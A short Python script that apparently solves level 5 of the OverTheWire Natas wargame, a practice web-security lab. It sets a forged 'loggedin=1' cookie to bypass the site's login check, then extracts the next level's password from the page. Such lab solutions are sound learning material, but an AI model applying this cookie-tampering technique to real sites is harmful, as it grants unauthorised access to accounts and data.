import requests
from requests.auth import HTTPBasicAuth
import natas4solution

auth = HTTPBasicAuth('natas5', natas4solution.get_pass())
def get_pass():
    cook = {'loggedin': '1'}
    r = requests.get('http://natas5.natas.labs.overthewire.org/', auth=auth,cookies=cook)
    webcontent = r.text
  #  print(webcontent)
    i = webcontent.find('natas6 is')+10
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
